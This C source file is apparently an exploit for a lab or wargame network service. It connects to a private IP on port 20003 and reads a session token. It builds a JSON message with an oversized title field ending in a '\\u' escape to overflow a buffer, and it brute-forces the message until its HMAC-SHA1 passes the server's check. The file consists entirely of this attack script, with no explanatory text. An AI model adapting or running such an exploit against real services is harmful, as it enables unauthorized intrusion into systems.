#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <limits.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <openssl/hmac.h>

void err(int ec, char *msg)
{
    printf(msg);
    printf("\n");
    exit(ec);
}

void print_hexdigest(unsigned char *result)
{
    unsigned int i;
    printf("[");
    for(i=0;i<20;i++)
        printf("%02x", result[i]);
    printf("]\n");
}

char *find_collision(char *text, char *key)
{
    unsigned int p, t_l, result_l=20;
    unsigned char result[20];
    char *t;

    for(p=0; p<UINT_MAX; p++)
    {
        t_l = asprintf(&t, text, p);
        HMAC(EVP_sha1(), key, strlen(key), (unsigned char *)t, t_l, result, &result_l);
        if(!(result[0] | result[1])){
            printf("%s\n", t);
            print_hexdigest(result);
            return t;
        }
    }
    return NULL;
}

int init_socket()
{
    int fd;
    struct sockaddr_in sin;

    memset(&sin, 0, sizeof(struct sockaddr_in));
    sin.sin_family = AF_INET;
    sin.sin_addr.s_addr = inet_addr("192.168.122.138");
    sin.sin_port = htons(atoi("20003"));
    fd = socket(AF_INET, SOCK_STREAM, 0);
    if(fd == -1) err(EXIT_FAILURE, "socket(): failed");
    if(connect(fd, (void *)&sin, sizeof(struct sockaddr_in)) == -1) 
        err(EXIT_FAILURE, "connect(): failed");
    return fd;
}

char *read_token(int fd)
{
    int n;
    char *buffer, *token;
    buffer = (char *) malloc(128);
    n = read(fd, buffer, 128);
    token = (char *) malloc(n);
    strncpy(token, buffer + 1, n-3);
    return token;
}

char *overflow_tags()
{
    int i;
    char *j, *junk;
    junk = (char *)malloc(256);
    memset(junk, 'A', 127);
    junk[128] = 0;
    strcat(junk, "\\\\uBBBB");
    strcat(junk, "CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC");
    return junk;
}

int main(int argc, char **argv)
{
    int fd;
    char *text_orig = "%s\n{'title':'%s', 'contents': 'my contents' , 'serverip': '127.0.0.1'} // %s";
    char *tokenised_text, *collided_text, *token, *junk;

    fd = init_socket();
    token = read_token(fd);
    junk = overflow_tags();
    asprintf(&tokenised_text, text_orig, token, junk, "%x");
    collided_text = find_collision(tokenised_text, token);
    write(fd, collided_text, strlen(collided_text));
    
    return EXIT_SUCCESS;
}
